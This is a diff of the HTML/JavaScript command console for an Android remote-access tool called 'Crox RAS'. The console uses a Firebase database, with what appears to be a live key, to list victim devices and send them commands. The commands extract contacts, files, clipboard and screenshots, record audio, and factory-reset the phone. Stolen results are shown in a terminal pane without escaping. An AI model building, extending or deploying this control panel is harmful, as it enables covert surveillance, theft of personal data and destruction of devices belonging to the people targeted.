@@ -3,85 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crox Admin Panel</title>
+    <title>Crox RAS // Secure Command Center</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; }
+        .font-mono { font-family: 'JetBrains Mono', monospace; }
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #0f172a; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #475569; }
+        .glow-green { text-shadow: 0 0 10px rgba(74, 222, 128, 0.5); }
+    </style>
 </head>
-<body class="bg-gray-900 text-gray-100 font-sans h-screen flex flex-col">
+<body class="bg-slate-950 text-slate-100 h-screen flex flex-col overflow-hidden">
 
     <!-- Header -->
-    <header class="bg-gray-800 border-b border-gray-700 px-6 py-4 flex justify-between items-center shadow-md">
+    <header class="bg-slate-900 border-b border-slate-800 px-6 py-3.5 flex justify-between items-center shadow-lg">
         <div class="flex items-center space-x-3">
-            <span class="w-3 h-3 bg-green-500 rounded-full animate-pulse"></span>
-            <h1 class="text-xl font-bold tracking-wider text-green-400">CROX // RAS COMMAND CENTER</h1>
+            <div class="w-3 h-3 bg-emerald-500 rounded-full animate-ping"></div>
+            <span class="w-3 h-3 bg-emerald-500 rounded-full absolute"></span>
+            <h1 class="text-lg font-bold tracking-wider text-emerald-400 font-mono pl-3">CROX // SECURE COMMAND CENTER</h1>
         </div>
-        <div id="firebase-status" class="text-sm bg-gray-700 px-3 py-1 rounded text-yellow-400">Connecting Firebase...</div>
+        <div class="flex items-center space-x-4">
+            <div id="online-count" class="text-xs bg-slate-800 border border-slate-700 px-3 py-1.5 rounded-full text-slate-300 font-mono">
+                Devices Online: <span class="text-emerald-400 font-bold">0</span>
+            </div>
+            <div id="firebase-status" class="text-xs bg-slate-800 border border-slate-700 px-3 py-1.5 rounded-full text-amber-400 font-mono">
+                Connecting Firebase...
+            </div>
+        </div>
     </header>
 
     <div class="flex flex-1 overflow-hidden">
         <!-- Sidebar: Devices -->
-        <aside class="w-80 bg-gray-800 border-r border-gray-700 flex flex-col">
-            <div class="p-4 border-b border-gray-700 font-semibold text-gray-300">Connected Devices</div>
-            <div id="device-list" class="flex-1 overflow-y-auto divide-y divide-gray-700">
+        <aside class="w-80 bg-slate-900/80 backdrop-blur border-r border-slate-800 flex flex-col">
+            <div class="p-4 border-b border-slate-800 flex justify-between items-center">
+                <span class="font-semibold text-xs tracking-wider uppercase text-slate-400 font-mono">Connected Devices</span>
+                <span class="text-[10px] bg-emerald-500/10 text-emerald-400 px-2 py-0.5 rounded font-mono border border-emerald-500/20">LIVE SYNC</span>
+            </div>
+            <div class="p-3 border-b border-slate-800">
+                <input type="text" id="device-search" placeholder="Search device ID..." class="w-full bg-slate-950 border border-slate-800 rounded px-3 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-emerald-500 font-mono">
+            </div>
+            <div id="device-list" class="flex-1 overflow-y-auto divide-y divide-slate-800/60">
                 <!-- Dynamic devices -->
+                <div class="p-6 text-center text-xs text-slate-500 font-mono">Waiting for active device connection...</div>
             </div>
         </aside>
 
-        <!-- Main Content: Command Dispatcher & Terminal -->
-        <main class="flex-1 flex flex-col bg-gray-900 overflow-hidden">
+        <!-- Main Content -->
+        <main class="flex-1 flex flex-col bg-slate-950 overflow-hidden">
             <!-- Selected Device Banner -->
-            <div class="bg-gray-800 px-6 py-3 border-b border-gray-700 flex justify-between items-center">
-                <span id="selected-device-label" class="text-sm font-medium text-gray-400">Select a device from the sidebar</span>
-                <span id="device-id-badge" class="text-xs bg-gray-700 text-green-300 px-2 py-1 rounded"></span>
+            <div class="bg-slate-900/50 backdrop-blur px-6 py-3 border-b border-slate-800 flex justify-between items-center">
+                <div class="flex items-center space-x-3">
+                    <span id="selected-device-label" class="text-xs font-mono text-slate-400 uppercase">Status:</span>
+                    <span id="device-id-badge" class="text-xs bg-slate-800 border border-slate-700 text-emerald-300 px-3 py-1 rounded font-mono font-bold">No Device Selected</span>
+                </div>
+                <div id="device-meta" class="text-xs text-slate-400 font-mono hidden">
+                    Model: <span id="meta-model" class="text-slate-200">--</span> | SDK: <span id="meta-sdk" class="text-slate-200">--</span>
+                </div>
             </div>
 
-            <!-- Command Dispatcher Grid (31 Commands) -->
-            <div class="p-4 bg-gray-800/50 border-b border-gray-700 overflow-y-auto max-h-72">
-                <h3 class="text-xs font-bold text-gray-400 uppercase tracking-wider mb-3">Command Dispatcher (31 Actions)</h3>
+            <!-- Command Dispatcher Grid (30 Actions) -->
+            <div class="p-4 bg-slate-900/30 border-b border-slate-800 overflow-y-auto max-h-64">
+                <div class="flex justify-between items-center mb-3">
+                    <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider font-mono">Command Dispatcher (30 Actions)</h3>
+                    <span class="text-[10px] text-slate-500 font-mono">Click command to execute instantly</span>
+                </div>
                 <div id="commands-grid" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-2">
                     <!-- Populated via JS -->
                 </div>
             </div>
 
             <!-- Terminal Output Viewer -->
-            <div class="flex-1 flex flex-col bg-black p-4 overflow-hidden">
+            <div class="flex-1 flex flex-col bg-slate-950 p-4 overflow-hidden">
                 <div class="flex justify-between items-center mb-2">
-                    <span class="text-xs font-mono text-gray-500 uppercase">Live Output Terminal</span>
-                    <button onclick="clearTerminal()" class="text-xs text-gray-400 hover:text-white bg-gray-800 px-2 py-1 rounded">Clear</button>
+                    <div class="flex items-center space-x-2">
+                        <span class="w-2 h-2 rounded-full bg-emerald-500"></span>
+                        <span class="text-xs font-mono text-slate-400 uppercase tracking-wider">Live Output Terminal</span>
+                    </div>
+                    <div class="flex space-x-2">
+                        <button onclick="copyTerminal()" class="text-xs text-slate-300 hover:text-white bg-slate-800 hover:bg-slate-700 border border-slate-700 px-3 py-1 rounded font-mono transition">Copy</button>
+                        <button onclick="clearTerminal()" class="text-xs text-slate-300 hover:text-white bg-slate-800 hover:bg-slate-700 border border-slate-700 px-3 py-1 rounded font-mono transition">Clear</button>
+                    </div>
                 </div>
-                <div id="terminal-output" class="flex-1 font-mono text-xs text-green-400 overflow-y-auto bg-black p-3 border border-gray-800 rounded space-y-1">
-                    [System] Initialized dashboard. Waiting for device selection...
+                <div id="terminal-output" class="flex-1 font-mono text-xs text-emerald-400 overflow-y-auto bg-slate-900/80 p-4 border border-slate-800/80 rounded-lg shadow-inner space-y-1 select-all">
+                    [System] Admin panel initialized successfully. Select a connected device from the left sidebar to begin telemetry extraction and remote operations.
                 </div>
             </div>
         </main>
     </div>
 
-    <!-- Firebase Config Modal / Setup Script -->
+    <!-- Firebase Script & Logic -->
     <script>
-        // CONFIGURATION: Replace with your Firebase project config
         const firebaseConfig = {
-            apiKey: "AIzaSyDummyKeyForCroxRASDemo12345",
-            authDomain: "crox-ras.firebaseapp.com",
-            databaseURL: "https://crox-ras-default-rtdb.firebaseio.com",
-            projectId: "crox-ras",
-            storageBucket: "crox-ras.appspot.com",
-            messagingSenderId: "1234567890",
-            appId: "1:1234567890:web:abcdef"
+            apiKey: "AIzaSyBbyRTb26Op3Q9ovv4MrPEtr4obN9Ej_ko",
+            authDomain: "remot-b334d.firebaseapp.com",
+            databaseURL: "https://remot-b334d-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "remot-b334d",
+            storageBucket: "remot-b334d.firebasestorage.app",
+            messagingSenderId: "740672688643",
+            appId: "1:740672688643:web:7a104590f2eb30b917f436"
         };
 
-        // Initialize Firebase
         try {
             firebase.initializeApp(firebaseConfig);
-            document.getElementById('firebase-status').innerText = 'Firebase Connected';
-            document.getElementById('firebase-status').className = 'text-sm bg-gray-700 px-3 py-1 rounded text-green-400';
+            const statusEl = document.getElementById('firebase-status');
+            statusEl.innerText = 'Firebase Connected';
+            statusEl.className = 'text-xs bg-slate-800 border border-emerald-500/30 px-3 py-1.5 rounded-full text-emerald-400 font-mono shadow-sm';
         } catch (e) {
-            document.getElementById('firebase-status').innerText = 'Firebase Config Error';
-            document.getElementById('firebase-status').className = 'text-sm bg-gray-700 px-3 py-1 rounded text-red-400';
+            const statusEl = document.getElementById('firebase-status');
+            statusEl.innerText = 'Firebase Config Error';
+            statusEl.className = 'text-xs bg-slate-800 border border-red-500/30 px-3 py-1.5 rounded-full text-red-400 font-mono shadow-sm';
         }
 
         const db = firebase.database();
         let selectedDeviceId = null;
+        let devicesData = {};
 
         const commandsList = [
             { id: 'extractContacts', name: 'Extract Contacts' },
@@ -95,7 +135,7 @@
             { id: 'extractExternalInfo', name: 'External Storage' },
             { id: 'extractAudioRecording', name: 'Record Audio' },
             { id: 'extractScreenshot', name: 'Extract Screenshot' },
-            { id: 'extractPhoneFiles', name: 'List Files (/sdcard/)', hasArg: true },
+            { id: 'extractPhoneFiles', name: 'List Files (/sdcard/)', hasArg: true, argPlaceholder: '/sdcard/' },
             { id: 'extractPhoneApplications', name: 'Installed Apps' },
             { id: 'extractClipboard', name: 'Get Clipboard' },
             { id: 'formatDevice', name: 'Factory Reset', danger: true },
@@ -119,7 +159,11 @@
         const grid = document.getElementById('commands-grid');
         commandsList.forEach(cmd => {
             const btn = document.createElement('button');
-            btn.className = `p-2 rounded text-xs font-semibold transition border ${cmd.danger ? 'bg-red-900/40 border-red-700 text-red-300 hover:bg-red-800' : 'bg-gray-700 border-gray-600 text-gray-200 hover:bg-gray-600'}`;
+            btn.className = `p-2.5 rounded-lg text-xs font-semibold transition border shadow-sm font-mono flex items-center justify-center text-center ${
+                cmd.danger 
+                ? 'bg-rose-950/40 border-rose-800/60 text-rose-300 hover:bg-rose-900/60 hover:border-rose-700' 
+                : 'bg-slate-800 border-slate-700 text-slate-200 hover:bg-slate-750 hover:border-slate-600 hover:text-white'
+            }`;
             btn.innerText = cmd.name;
             btn.onclick = () => dispatchCommand(cmd);
             grid.appendChild(btn);
@@ -127,48 +171,92 @@
 
         // Listen for devices
         db.ref('devices').on('value', snapshot => {
+            devicesData = snapshot.val() || {};
+            renderDeviceList();
+        });
+
+        document.getElementById('device-search').addEventListener('input', (e) => {
+            renderDeviceList(e.target.value.toLowerCase());
+        });
+
+        function renderDeviceList(filter = '') {
             const deviceListEl = document.getElementById('device-list');
             deviceListEl.innerHTML = '';
             
-            if (!snapshot.exists()) {
-                deviceListEl.innerHTML = '<div class="p-4 text-xs text-gray-500">No devices connected</div>';
+            const keys = Object.keys(devicesData);
+            let onlineCount = 0;
+
+            if (keys.length === 0) {
+                deviceListEl.innerHTML = '<div class="p-6 text-center text-xs text-slate-500 font-mono">No devices connected</div>';
+                document.querySelector('#online-count span').innerText = '0';
                 return;
             }
 
-            snapshot.forEach(child => {
-                const deviceIdKey = child.key;
+            keys.forEach(deviceIdKey => {
+                if (filter && !deviceIdKey.toLowerCase().includes(filter)) return;
+                onlineCount++;
+
+                const devInfo = devicesData[deviceIdKey]?.status || {};
+                const isSelected = selectedDeviceId === deviceIdKey;
+
                 const div = document.createElement('div');
-                div.className = `p-3 cursor-pointer hover:bg-gray-700/50 flex justify-between items-center ${selectedDeviceId === deviceIdKey ? 'bg-gray-700' : ''}`;
+                div.className = `p-3.5 cursor-pointer transition flex justify-between items-center border-l-2 ${
+                    isSelected 
+                    ? 'bg-slate-800/90 border-emerald-500 text-white' 
+                    : 'border-transparent hover:bg-slate-800/40 text-slate-300'
+                }`;
                 div.innerHTML = `
-                    <div>
-                        <div class="font-mono text-xs text-green-400">${deviceIdKey}</div>
-                        <div class="text-[10px] text-gray-400">Online</div>
+                    <div class="truncate pr-2">
+                        <div class="font-mono text-xs font-bold text-emerald-400 truncate">${deviceIdKey}</div>
+                        <div class="text-[10px] text-slate-400 font-mono mt-0.5">${devInfo.model || 'Android Device'} • SDK ${devInfo.sdk || '--'}</div>
                     </div>
-                    <span class="w-2 h-2 rounded-full bg-green-500"></span>
+                    <div class="flex items-center space-x-1.5 flex-shrink-0">
+                        <span class="text-[10px] text-emerald-400 font-mono">ONLINE</span>
+                        <span class="w-2 h-2 rounded-full bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.5)]"></span>
+                    </div>
                 `;
                 div.onclick = () => selectDevice(deviceIdKey);
                 deviceListEl.appendChild(div);
             });
-        });
+
+            document.querySelector('#online-count span').innerText = onlineCount;
+        }
 
         function selectDevice(id) {
             selectedDeviceId = id;
-            document.getElementById('selected-device-label').innerText = 'Active Device:';
+            renderDeviceList(document.getElementById('device-search').value.toLowerCase());
+
+            document.getElementById('selected-device-label').innerText = 'Active Device ID:';
             document.getElementById('device-id-badge').innerText = id;
-            logTerminal(`[System] Selected device: ${id}`);
             
-            // Listen to device data
+            const meta = devicesData[id]?.status || {};
+            document.getElementById('device-meta').classList.remove('hidden');
+            document.getElementById('meta-model').innerText = meta.model || 'Unknown';
+            document.getElementById('meta-sdk').innerText = meta.sdk || '--';
+
+            logTerminal(`[System] Selected target device: ${id}`);
+            
+            // Listen to device data response
             db.ref(`devices/${id}/data`).limitToLast(1).on('child_added', snapshot => {
                 const val = snapshot.val();
-                if (val) {
-                    logTerminal(`[Data Received - ${val.action}]:\n${JSON.stringify(val.payload, null, 2)}`);
+                if (val && selectedDeviceId === id) {
+                    try {
+                        const parsed = typeof val.payload === 'string' ? JSON.parse(val.payload) : val.payload;
+                        logTerminal(`[Data Received // ${val.action}]:\n${JSON.stringify(parsed, null, 2)}`);
+                    } catch (e) {
+                        logTerminal(`[Data Received // ${val.action}]:\n${val.payload}`);
+                    }
                 }
             });
         }
 
         function dispatchCommand(cmd) {
             if (!selectedDeviceId) {
-                alert('Please select a device first!');
+                alert('Please select a target device from the left sidebar first!');
+                return;
+            }
+
+            if (cmd.danger && !confirm(`WARNING: Are you sure you want to execute "${cmd.name}" on device ${selectedDeviceId}?`)) {
                 return;
             }
 
@@ -191,18 +279,24 @@
             };
 
             db.ref(`devices/${selectedDeviceId}/commands`).push(commandObj);
-            logTerminal(`[Command Sent] -> ${cmd.id} ${arg ? '('+arg+')' : ''}`);
+            logTerminal(`[Command Dispatched] -> ${cmd.id} ${arg ? '('+arg+')' : ''}`);
         }
 
         function logTerminal(text) {
             const term = document.getElementById('terminal-output');
             const time = new Date().toLocaleTimeString();
-            term.innerHTML += `\n<span class="text-gray-500">[${time}]</span> ${text}`;
+            term.innerHTML += `\n<span class="text-slate-500">[${time}]</span> ${text}`;
             term.scrollTop = term.scrollHeight;
         }
 
         function clearTerminal() {
             document.getElementById('terminal-output').innerHTML = '[System] Terminal cleared.';
+        }
+
+        function copyTerminal() {
+            const text = document.getElementById('terminal-output').innerText;
+            navigator.clipboard.writeText(text);
+            alert('Terminal output copied to clipboard!');
         }
     </script>
 </body>
